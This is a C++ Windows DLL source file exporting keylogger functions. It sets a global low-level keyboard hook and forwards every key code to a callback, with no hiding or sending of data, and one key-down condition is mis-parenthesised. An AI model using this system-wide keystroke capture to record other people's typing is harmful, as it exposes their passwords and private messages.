#include "main.h"

#include <iostream>
using namespace std;

HHOOK hook = NULL;
HINSTANCE hinstance = NULL;
HWND hwnd = NULL;
KBDLLHOOKSTRUCT kbd;
keylogger_callback the_callback_function(0);

/*
DLL_EXPORT void keylogger_set_callback()
DLL_EXPORT void keylogger_init(HINSTANCE h);
DLL_EXPORT void keylogger_shutdown();

// gets called when a key event is fired.
DLL_EXPORT LRESULT CALLBACK keylogger_callback(
	 int ncode
	,WPARAM wparam
	,LPARAM lparam
);

*/

DLL_EXPORT void keylogger_set_callback(keylogger_callback cb) {
	the_callback_function = cb;
}

DLL_EXPORT void keylogger_init(HINSTANCE h) {
	// Set the keylogger hook so we intersect keys.
	hook = SetWindowsHookEx(
				 WH_KEYBOARD_LL
				,keylogger_hook_callback
				,h
				,0
	);

	// show some info when we fail.
	if(hook == NULL) {
		DWORD dw = GetLastError();
		cout 	<< "cannot set keylogger hook, errorcode: "
				<< dw << endl;
	}
}

DLL_EXPORT void keylogger_shutdown() {
	UnhookWindowsHookEx(hook);
}

// This function gets called by the hook
DLL_EXPORT LRESULT CALLBACK keylogger_hook_callback(
	int ncode
	,WPARAM wparam
	,LPARAM lparam
)
{
	if( (ncode == HC_ACTION)
		&& ((wparam == WM_SYSKEYDOWN))|| (wparam == WM_KEYDOWN)
	)
	{
		// @todo figure out how to get modifier key
		kbd = *((KBDLLHOOKSTRUCT*)lparam);
		unsigned int key = (unsigned int)kbd.vkCode;
		the_callback_function((int)key,0);
	}
	return ( CallNextHookEx(hook,ncode,wparam,lparam) );//pass control to next hook in the hook chain.
}


BOOL WINAPI DllMain(
	 HANDLE mod
	,DWORD reason
	,LPVOID reserved)
{
    switch (reason) {
        case DLL_PROCESS_ATTACH: break;
        case DLL_PROCESS_DETACH: break;
        case DLL_THREAD_ATTACH: break;
        case DLL_THREAD_DETACH: break;
    }

	hinstance = (HINSTANCE)mod;
	hook = NULL;
    return TRUE;
}
